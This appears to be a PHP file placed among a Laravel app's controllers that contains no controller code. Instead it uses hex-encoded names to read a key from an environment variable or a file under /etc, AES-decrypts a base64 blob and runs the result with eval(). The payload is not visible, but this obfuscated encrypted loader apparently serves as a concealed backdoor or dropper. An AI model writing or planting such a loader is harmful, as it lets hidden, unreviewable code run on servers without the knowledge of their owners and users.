<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('fpDTXkXr2SJn6FIIiJo1hg==');

$c=base64_decode(

'v9ukzWGNNoO+KeZICsBrDhhuVLULPwB9d1ngNppnxuiPDFb9FbgEXVvANmFcfPuYO9mfaA3ySCGX' .
'r2IVR3rr/5lZ0uzmArHiVNL3sDybsbuQRUqeUXwl+lvsxB+cSQL9aiNJsFbbsDBwX3E1IBRlAJTX' .
'6NExioXsLuaIdd3meI/mz3/HnaoK72FLFyWGmAsFvzeu1Bp9B2t3Vb6+Ys19ecmga2PDwrTzDUi9' .
'+csuY5ujwnP5IMSYrCW/NtQVGCzU'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

